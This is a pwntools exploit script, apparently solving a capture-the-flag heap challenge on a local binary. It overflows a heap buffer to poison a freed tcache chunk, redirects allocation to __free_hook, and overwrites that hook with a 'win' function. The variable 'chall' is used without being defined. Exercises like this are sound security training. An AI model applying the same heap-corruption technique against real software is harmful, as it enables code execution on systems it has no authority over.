#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

if len(argv) >= 2 and argv[1] == "r":
    p = remote("localhost", 9002)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b main
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)
# get some address
p.recvuntil("<__free_hook>: ")
free_hook_addr = eval(p.recv(14))
log.info("__free_hook: 0x{:08x}".format(free_hook_addr))
p.recvuntil("<win>: ")
win_addr = eval(p.recv(14))
log.info("win func: 0x{:08x}".format(win_addr))
# malloc chunk B
p.recvuntil(">")
p.sendline("2")
p.send(p64(0xdeadbeef))
# free chunk B
p.recvuntil(">")
p.sendline("3")
# heap overflow
"""
freed chunk struct(tcache)
+---------------------+
|  size & some flag   |
+---------------------+
| fd(next chunk addr) |
+---------------------+
|   ..............    |
"""
payload = b""
payload += b"A" * 0x8 * 3# chunk A buffer
payload += p64(0x30)# chunk B size & flag
payload += p64(free_hook_addr)# fd
p.recvuntil(">")
p.sendline("1")
sleep(0.2)
p.send(payload)
# malloc & free chunk B
p.recvuntil(">")
p.sendline("2")
p.send(p64(0xdeadbeef))
p.recvuntil(">")
p.sendline("3")
# malloc __free_hook
p.recvuntil(">")
p.sendline("2")
p.send(p64(win_addr))
# exec win
p.recvuntil(">")
p.sendline("3")

p.interactive()
